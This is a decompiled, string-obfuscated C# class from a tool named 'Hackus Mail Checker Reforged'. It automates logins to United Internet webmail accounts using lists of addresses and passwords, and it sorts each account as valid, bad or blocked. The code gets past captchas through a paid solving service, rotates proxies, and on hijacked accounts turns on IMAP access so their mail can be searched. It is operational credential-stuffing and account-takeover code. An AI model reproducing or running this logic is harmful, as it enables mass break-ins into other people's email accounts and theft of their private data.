using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Helpers;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail;
using Hackus_Mail_Checker_Reforged.Net.Web.UnitedInternet.RequestHelpers;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net
{
	// Token: 0x020000B2 RID: 178
	public class UnitedInternetClientNew
	{
		// Token: 0x17000139 RID: 313
		// (get) Token: 0x060005A8 RID: 1448 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x060005A9 RID: 1449 RVA: 0x00009CDB File Offset: 0x00007EDB
		public UnitedInternetClientNew(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x060005AA RID: 1450 RVA: 0x00023C30 File Offset: 0x00021E30
		public void Handle()
		{
			if (this._mailbox == null)
			{
				return;
			}
			Server server = ConfigurationManager.Instance.Configuration.Find(this._mailbox.Domain, ProtocolType.IMAP);
			if (server != null && new MailHandler(this._mailbox, server).WebHandle(true) == OperationResult.Ok)
			{
				return;
			}
			this._requestHelper = RequestHelper.Get(this._mailbox.Domain);
			OperationResult operationResult = this.Login();
			StatisticsManager.Instance.Increment(operationResult);
			FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
			if (operationResult == OperationResult.Ok)
			{
				if (!SearchSettings.Instance.Search)
				{
					MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
				}
				bool flag = false;
				if (SearchSettings.Instance.Search || WebSettings.Instance.EnableGmxImapAccess)
				{
					if (!WebSettings.Instance.SolveCaptcha || string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
					{
						return;
					}
					flag = this.EnableImapAccess();
				}
				if (SearchSettings.Instance.Search && flag && server != null)
				{
					new MailHandler(this._mailbox, server).WebHandle(false);
				}
			}
		}

		// Token: 0x060005AB RID: 1451 RVA: 0x00023D4C File Offset: 0x00021F4C
		private OperationResult Login()
		{
			OperationResult operationResult;
			OperationResult item;
			do
			{
				this.Reset();
				operationResult = this.CreateSession();
				if (operationResult == OperationResult.Captcha)
				{
					if (!WebSettings.Instance.SolveCaptcha || string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
					{
						return OperationResult.Captcha;
					}
					ValueTuple<OperationResult, MemoryStream> captchaImage = this.GetCaptchaImage();
					item = captchaImage.Item1;
					MemoryStream item2 = captchaImage.Item2;
					if (item == OperationResult.Error)
					{
						goto Block_4;
					}
					if (item == OperationResult.HttpError)
					{
						continue;
					}
					ValueTuple<OperationResult, string> valueTuple = CaptchaHelpers.CreateInstance().SolveCaptcha(Convert.ToBase64String(item2.ToArray()), <Module>.smethod_2<string>(-1746043920), false);
					OperationResult item3 = valueTuple.Item1;
					string item4 = valueTuple.Item2;
					if (item3 == OperationResult.Error)
					{
						return OperationResult.Captcha;
					}
					if (item3 == OperationResult.HttpError)
					{
						continue;
					}
					operationResult = this.SubmitCaptchaAnswer(item4);
					if (operationResult == OperationResult.Error)
					{
						return operationResult;
					}
					if (operationResult == OperationResult.HttpError || operationResult == OperationResult.Captcha)
					{
						continue;
					}
				}
			}
			while (operationResult == OperationResult.HttpError);
			return operationResult;
			Block_4:
			StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, <Module>.smethod_2<string>(-979085578));
			return item;
		}

		// Token: 0x060005AC RID: 1452 RVA: 0x00023E38 File Offset: 0x00022038
		private OperationResult CreateSession()
		{
			this.WaitPause();
			OperationResult result;
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = true;
					List<KeyValuePair<string, string>> list = new List<KeyValuePair<string, string>>
					{
						new KeyValuePair<string, string>(<Module>.smethod_5<string>(573593010), this._mailbox.Address),
						new KeyValuePair<string, string>(<Module>.smethod_2<string>(-46006352), this._mailbox.Password),
						new KeyValuePair<string, string>(<Module>.smethod_6<string>(-819234028), <Module>.smethod_3<string>(1727504444))
					};
					this._requestHelper.SetLoginParameters(list);
					FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(list, false, null);
					string input = httpRequest.Post(this._requestHelper.Hackus_Mail_Checker_Reforged.Net.Web.UnitedInternet.RequestHelpers.RequestHelper.LoginURL, formUrlEncodedContent).ToString();
					string text = httpRequest.Address.ToString();
					if (text.Contains(<Module>.smethod_5<string>(-1059671260)))
					{
						Match match = Regex.Match(input, <Module>.smethod_3<string>(1767914527));
						if (match.Success)
						{
							this._ott = match.Groups[1].Value;
						}
						result = OperationResult.Ok;
					}
					else if (text.Contains(<Module>.smethod_2<string>(-1795102619)))
					{
						result = OperationResult.Bad;
					}
					else if (text.Contains(<Module>.smethod_3<string>(644141959)))
					{
						result = OperationResult.Blocked;
					}
					else if (!text.Contains(<Module>.smethod_4<string>(2095357477)))
					{
						result = OperationResult.Error;
					}
					else
					{
						Match match2 = Regex.Match(input, <Module>.smethod_4<string>(1306093417));
						if (match2.Success)
						{
							string value = match2.Groups[1].Value;
							match2 = Regex.Match(value, <Module>.smethod_6<string>(-1860364206));
							if (!match2.Success)
							{
								result = OperationResult.Error;
							}
							else
							{
								this._token = match2.Groups[1].Value;
								match2 = Regex.Match(value, <Module>.smethod_2<string>(-81469312));
								if (!match2.Success)
								{
									result = OperationResult.Error;
								}
								else
								{
									this._antiCache = match2.Groups[1].Value;
									result = OperationResult.Captcha;
								}
							}
						}
						else
						{
							result = OperationResult.Error;
						}
					}
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
				result = OperationResult.HttpError;
			}
			return result;
		}

		// Token: 0x060005AD RID: 1453 RVA: 0x000240B0 File Offset: 0x000222B0
		[return: TupleElementNames(new string[]
		{
			"status",
			"image"
		})]
		public ValueTuple<OperationResult, MemoryStream> GetCaptchaImage()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						httpRequest.AddUrlParam(<Module>.smethod_6<string>(658210312), "");
						httpRequest.AddUrlParam(<Module>.smethod_4<string>(603991106), <Module>.smethod_3<string>(-358400360));
						httpRequest.AddUrlParam(<Module>.smethod_4<string>(-1850962823), <Module>.smethod_2<string>(-930126043));
						httpRequest.AddUrlParam(<Module>.smethod_6<string>(461623556), this._mailbox.Address);
						httpRequest.AddUrlParam(<Module>.smethod_4<string>(-940878781), this._token);
						httpRequest.AddUrlParam(<Module>.smethod_6<string>(-353513521), this._antiCache);
						if (!string.IsNullOrEmpty(this._requestHelper.Hackus_Mail_Checker_Reforged.Net.Web.UnitedInternet.RequestHelpers.RequestHelper.SuccessURL))
						{
							httpRequest.AddUrlParam(<Module>.smethod_3<string>(34135836), this._requestHelper.Hackus_Mail_Checker_Reforged.Net.Web.UnitedInternet.RequestHelpers.RequestHelper.SuccessURL);
						}
						MemoryStream memoryStream = httpRequest.Get(<Module>.smethod_5<string>(-1687146663) + this._requestHelper.Hackus_Mail_Checker_Reforged.Net.Web.UnitedInternet.RequestHelpers.RequestHelper.BaseURL + <Module>.smethod_2<string>(-2126947731), null).ToMemoryStream();
						if (memoryStream != null && memoryStream.Length != 0L)
						{
							return new ValueTuple<OperationResult, MemoryStream>(OperationResult.Ok, memoryStream);
						}
						return new ValueTuple<OperationResult, MemoryStream>(OperationResult.Error, null);
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return new ValueTuple<OperationResult, MemoryStream>(OperationResult.HttpError, null);
		}

		// Token: 0x060005AE RID: 1454 RVA: 0x00024264 File Offset: 0x00022464
		private OperationResult SubmitCaptchaAnswer(string answer)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = true;
						httpRequest.AddUrlParam(<Module>.smethod_6<string>(-1241709910), "");
						httpRequest.AddUrlParam(<Module>.smethod_3<string>(-1803526153), <Module>.smethod_3<string>(-358400360));
						httpRequest.AddUrlParam(<Module>.smethod_5<string>(-1898556907), <Module>.smethod_5<string>(-36000308));
						httpRequest.AddUrlParam(<Module>.smethod_5<string>(573593010), this._mailbox.Address);
						httpRequest.AddUrlParam(<Module>.smethod_2<string>(2018416854), this._token);
						if (!string.IsNullOrEmpty(this._requestHelper.Hackus_Mail_Checker_Reforged.Net.Web.UnitedInternet.RequestHelpers.RequestHelper.SuccessURL))
						{
							httpRequest.AddUrlParam(<Module>.smethod_6<string>(-1686672997), this._requestHelper.Hackus_Mail_Checker_Reforged.Net.Web.UnitedInternet.RequestHelpers.RequestHelper.SuccessURL);
						}
						FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
						{
							new KeyValuePair<string, string>(<Module>.smethod_2<string>(2018416854), this._token),
							new KeyValuePair<string, string>(<Module>.smethod_3<string>(676842286), this._mailbox.Address),
							new KeyValuePair<string, string>(<Module>.smethod_5<string>(-1001255321), this._mailbox.Password),
							new KeyValuePair<string, string>(<Module>.smethod_4<string>(2124207391), answer),
							new KeyValuePair<string, string>(<Module>.smethod_3<string>(-1208939542), <Module>.smethod_5<string>(-415504783))
						}, false, null);
						string input = httpRequest.Post(<Module>.smethod_2<string>(-745159536) + this._requestHelper.Hackus_Mail_Checker_Reforged.Net.Web.UnitedInternet.RequestHelpers.RequestHelper.BaseURL + <Module>.smethod_5<string>(-204492796), formUrlEncodedContent).ToString();
						string text = httpRequest.Address.ToString();
						if (text.Contains(<Module>.smethod_4<string>(71403974)))
						{
							Match match = Regex.Match(input, <Module>.smethod_6<string>(-1262467330));
							if (match.Success)
							{
								this._ott = match.Groups[1].Value;
							}
							return OperationResult.Ok;
						}
						if (text.Contains(<Module>.smethod_4<string>(-1507124146)))
						{
							return OperationResult.Bad;
						}
						if (text.Contains(<Module>.smethod_4<string>(-533919950)))
						{
							return OperationResult.Blocked;
						}
						if (!text.Contains(<Module>.smethod_6<string>(656480527)))
						{
							return OperationResult.Error;
						}
						Match match2 = Regex.Match(input, <Module>.smethod_5<string>(-1634691419));
						if (!match2.Success)
						{
							return OperationResult.Error;
						}
						string value = match2.Groups[1].Value;
						match2 = Regex.Match(value, <Module>.smethod_5<string>(-531940284));
						if (!match2.Success)
						{
							return OperationResult.Error;
						}
						this._token = match2.Groups[1].Value;
						match2 = Regex.Match(value, <Module>.smethod_2<string>(-81469312));
						if (match2.Success)
						{
							this._antiCache = match2.Groups[1].Value;
							return OperationResult.Captcha;
						}
						return OperationResult.Error;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005AF RID: 1455 RVA: 0x000245CC File Offset: 0x000227CC
		private OperationResult GetJSession()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = true;
						httpRequest.AddUrlParam(<Module>.smethod_5<string>(-853427077), this._ott);
						httpRequest.AddUrlParam(<Module>.smethod_2<string>(-845802712), <Module>.smethod_5<string>(-1793646419));
						httpRequest.AddUrlParam(<Module>.smethod_4<string>(-2122064708), <Module>.smethod_3<string>(1727504444));
						string input = httpRequest.Get(<Module>.smethod_2<string>(-13465826) + this._requestHelper.Hackus_Mail_Checker_Reforged.Net.Web.UnitedInternet.RequestHelpers.RequestHelper.NavigatorURL + <Module>.smethod_5<string>(629226790), null).ToString();
						if (httpRequest.Address.ToString().Contains(<Module>.smethod_3<string>(1119425760)))
						{
							Match match = Regex.Match(input, <Module>.smethod_3<string>(838482618));
							if (match.Success)
							{
								this._jsession = match.Groups[1].Value;
								return OperationResult.Ok;
							}
						}
					}
					return OperationResult.Error;
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005B0 RID: 1456 RVA: 0x00024718 File Offset: 0x00022918
		private OperationResult OpenImapSettings()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = true;
						string input = httpRequest.Get(<Module>.smethod_2<string>(-13465826) + this._requestHelper.Hackus_Mail_Checker_Reforged.Net.Web.UnitedInternet.RequestHelpers.RequestHelper.ApiURL + <Module>.smethod_3<string>(-4346808) + this._jsession, null).ToString();
						if (httpRequest.Address.ToString().Contains(<Module>.smethod_6<string>(-58024653)))
						{
							Match match = Regex.Match(input, <Module>.smethod_2<string>(-1694459443));
							if (!match.Success)
							{
								return OperationResult.Error;
							}
							this._tempUrl = match.Groups[1].Value;
							match = Regex.Match(input, <Module>.smethod_2<string>(1120800588));
							if (!match.Success)
							{
								return OperationResult.Error;
							}
							this._idHf = match.Groups[1].Value;
							match = Regex.Match(input, <Module>.smethod_3<string>(-1047299210));
							if (match.Success)
							{
								this._wicketElementId = match.Groups[1].Value;
								return OperationResult.Ok;
							}
							return OperationResult.Error;
						}
					}
					return OperationResult.Error;
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005B1 RID: 1457 RVA: 0x000248B8 File Offset: 0x00022AB8
		private OperationResult EnableImap()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = true;
						httpRequest.AddHeader(<Module>.smethod_5<string>(1626272803), <Module>.smethod_4<string>(-35515321));
						httpRequest.AddHeader(<Module>.smethod_2<string>(-144024586), <Module>.smethod_3<string>(-404592760));
						httpRequest.AddHeader(<Module>.smethod_4<string>(356930816), this._wicketElementId);
						httpRequest.AddHeader(<Module>.smethod_3<string>(-121656043), <Module>.smethod_2<string>(-415939366));
						FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
						{
							new KeyValuePair<string, string>(this._idHf, ""),
							new KeyValuePair<string, string>(<Module>.smethod_4<string>(-1042465487), <Module>.smethod_4<string>(-1657406049)),
							new KeyValuePair<string, string>(<Module>.smethod_2<string>(-543873184), <Module>.smethod_2<string>(816196536))
						}, false, null);
						string text = httpRequest.Post(<Module>.smethod_5<string>(-1233329809) + this._requestHelper.Hackus_Mail_Checker_Reforged.Net.Web.UnitedInternet.RequestHelpers.RequestHelper.ApiURL + <Module>.smethod_5<string>(1014295583) + this._tempUrl, formUrlEncodedContent).ToString();
						if (httpRequest.Address.ToString().Contains(<Module>.smethod_6<string>(-58024653)))
						{
							if (!text.Contains(<Module>.smethod_4<string>(-945687100)))
							{
								return OperationResult.Ok;
							}
							Match match = Regex.Match(text, <Module>.smethod_6<string>(1268215683));
							if (!match.Success)
							{
								return OperationResult.Error;
							}
							this._idHf = match.Groups[1].Value;
							match = Regex.Match(text, <Module>.smethod_6<string>(673778377));
							if (!match.Success)
							{
								return OperationResult.Error;
							}
							this._wicketElementId = match.Groups[1].Value;
							match = Regex.Match(text, <Module>.smethod_2<string>(1420006010));
							if (!match.Success)
							{
								return OperationResult.Error;
							}
							this._imapCaptchaUrl = match.Groups[2].Value;
							match = Regex.Match(text, <Module>.smethod_3<string>(680697164));
							if (!match.Success)
							{
								return OperationResult.Error;
							}
							this._confirmImapCaptchaUrl = match.Groups[2].Value;
							return OperationResult.Captcha;
						}
					}
					return OperationResult.Captcha;
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005B2 RID: 1458 RVA: 0x00024B7C File Offset: 0x00022D7C
		[return: TupleElementNames(new string[]
		{
			"status",
			"image"
		})]
		private ValueTuple<OperationResult, MemoryStream> DownloadImapCaptcha()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						MemoryStream memoryStream = httpRequest.Get(<Module>.smethod_4<string>(380972411) + this._requestHelper.Hackus_Mail_Checker_Reforged.Net.Web.UnitedInternet.RequestHelpers.RequestHelper.ApiURL + <Module>.smethod_4<string>(2032237323) + this._imapCaptchaUrl, null).ToMemoryStream();
						if (memoryStream != null && memoryStream.Length != 0L)
						{
							return new ValueTuple<OperationResult, MemoryStream>(OperationResult.Ok, memoryStream);
						}
						return new ValueTuple<OperationResult, MemoryStream>(OperationResult.Error, null);
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return new ValueTuple<OperationResult, MemoryStream>(OperationResult.Error, null);
		}

		// Token: 0x060005B3 RID: 1459 RVA: 0x00024C4C File Offset: 0x00022E4C
		private OperationResult ConfirmImapCaptcha(string answer)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = true;
						httpRequest.AddHeader(<Module>.smethod_3<string>(1000122950), <Module>.smethod_6<string>(-271909259));
						httpRequest.AddHeader(<Module>.smethod_6<string>(529493513), <Module>.smethod_4<string>(-693818491));
						httpRequest.AddHeader(<Module>.smethod_4<string>(356930816), this._wicketElementId);
						httpRequest.AddHeader(<Module>.smethod_5<string>(-818853918), <Module>.smethod_2<string>(-415939366));
						FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
						{
							new KeyValuePair<string, string>(this._idHf, ""),
							new KeyValuePair<string, string>(<Module>.smethod_3<string>(-754791434), <Module>.smethod_6<string>(1565738703)),
							new KeyValuePair<string, string>(<Module>.smethod_4<string>(1175656797), answer)
						}, false, null);
						string text = httpRequest.Post(<Module>.smethod_3<string>(1962255186) + this._requestHelper.Hackus_Mail_Checker_Reforged.Net.Web.UnitedInternet.RequestHelpers.RequestHelper.ApiURL + <Module>.smethod_2<string>(187820526) + this._confirmImapCaptchaUrl, formUrlEncodedContent).ToString();
						if (httpRequest.Address.ToString().Contains(<Module>.smethod_2<string>(1352002524)))
						{
							if (text.Contains(<Module>.smethod_6<string>(849199371)) || text.Contains(<Module>.smethod_3<string>(530621466)))
							{
								return OperationResult.Ok;
							}
							if (text.Contains(<Module>.smethod_3<string>(1413860975)) || text.Contains(<Module>.smethod_3<string>(-1435980528)))
							{
								Match match = Regex.Match(text, <Module>.smethod_2<string>(1776318494));
								if (match.Success)
								{
									this._imapCaptchaUrl = match.Groups[1].Value;
									return OperationResult.Captcha;
								}
							}
						}
					}
					return OperationResult.Error;
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005B4 RID: 1460 RVA: 0x00024E88 File Offset: 0x00023088
		private bool EnableImapAccess()
		{
			if (this.GetJSession() != OperationResult.Ok)
			{
				return false;
			}
			OperationResult operationResult = this.OpenImapSettings();
			if (operationResult != OperationResult.Ok)
			{
				return false;
			}
			for (int i = 0; i < 10; i++)
			{
				operationResult = this.EnableImap();
				if (operationResult != OperationResult.Ok && operationResult != OperationResult.Captcha)
				{
					return false;
				}
				if (operationResult == OperationResult.Ok)
				{
					return true;
				}
				if (operationResult == OperationResult.Captcha)
				{
					ValueTuple<OperationResult, MemoryStream> valueTuple = this.DownloadImapCaptcha();
					OperationResult item = valueTuple.Item1;
					MemoryStream item2 = valueTuple.Item2;
					if (item != OperationResult.Ok)
					{
						return false;
					}
					ValueTuple<OperationResult, string> valueTuple2 = CaptchaHelpers.CreateInstance().SolveCaptcha(Convert.ToBase64String(item2.ToArray()), <Module>.smethod_4<string>(123771213), false);
					OperationResult item3 = valueTuple2.Item1;
					string item4 = valueTuple2.Item2;
					if (item3 != OperationResult.Ok)
					{
						return false;
					}
					operationResult = this.ConfirmImapCaptcha(item4);
					if (operationResult == OperationResult.Ok)
					{
						return true;
					}
				}
			}
			return false;
		}

		// Token: 0x060005B5 RID: 1461 RVA: 0x00009CEA File Offset: 0x00007EEA
		private void Reset()
		{
			this._cookies = new CookieDictionary(false);
			if (ProxySettings.Instance.UseProxy)
			{
				this._proxyClient = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x060005B6 RID: 1462 RVA: 0x00024F34 File Offset: 0x00023134
		private void SetHeaders(HttpRequest request)
		{
			request.IgnoreProtocolErrors = true;
			request.ConnectTimeout = CheckerSettings.Instance.Timeout * 1000;
			request.Cookies = this._cookies;
			request.Proxy = this._proxyClient;
			request.UserAgent = <Module>.smethod_5<string>(-1350161687);
		}

		// Token: 0x060005B7 RID: 1463 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x040002F7 RID: 759
		private Mailbox _mailbox;

		// Token: 0x040002F8 RID: 760
		private ProxyClient _proxyClient;

		// Token: 0x040002F9 RID: 761
		private CookieDictionary _cookies;

		// Token: 0x040002FA RID: 762
		private RequestHelper _requestHelper;

		// Token: 0x040002FB RID: 763
		private string _token;

		// Token: 0x040002FC RID: 764
		private string _antiCache;

		// Token: 0x040002FD RID: 765
		private string _ott;

		// Token: 0x040002FE RID: 766
		private string _jsession;

		// Token: 0x040002FF RID: 767
		private string _idHf;

		// Token: 0x04000300 RID: 768
		private string _wicketElementId;

		// Token: 0x04000301 RID: 769
		private string _tempUrl;

		// Token: 0x04000302 RID: 770
		private string _imapCaptchaUrl;

		// Token: 0x04000303 RID: 771
		private string _confirmImapCaptchaUrl;
	}
}
